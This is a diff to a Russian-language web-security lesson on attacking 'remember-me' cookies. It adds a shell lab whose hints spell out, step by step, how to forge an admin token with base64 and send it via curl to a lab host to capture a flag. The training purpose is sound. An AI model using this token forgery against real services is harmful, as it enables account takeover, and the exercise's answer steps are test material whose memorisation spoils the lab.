@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 40
 summary: "Как ломаются remember-me токены: base64(username:expiry:hash), слабый ключ, отсутствие ротации и theft через XSS."
+lab:
+  kind: shell
+  title: "Практика: подделка remember-me"
+  toolset: [core, base64, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Декодируй пример токена: `echo 'dXNlcjoxODkzNDU2MDAwOjEyMzQ1Ng==' | base64 -d`.
+    - Формат — `user:expiry:signature`; подпись сервер не проверяет.
+    - Собери токен для admin: `printf 'admin:1999999999:x' | base64`.
+    - Предъяви его: `curl -s 'https://shop.local/me' -H 'Cookie: remember-me=YWRtaW46MTk5OTk5OTk5OTp4' | grep 'nto{' > found.txt`, затем `check`.
 ---
 
 Галочка «запомнить меня» удобна: не надо вводить пароль при каждом входе. Технически это **долгоживущий токен** в cookie — и потому он ценнее обычной сессии: если токен подделать или украсть, атакующий получает аккаунт надолго, часто незаметно для владельца.
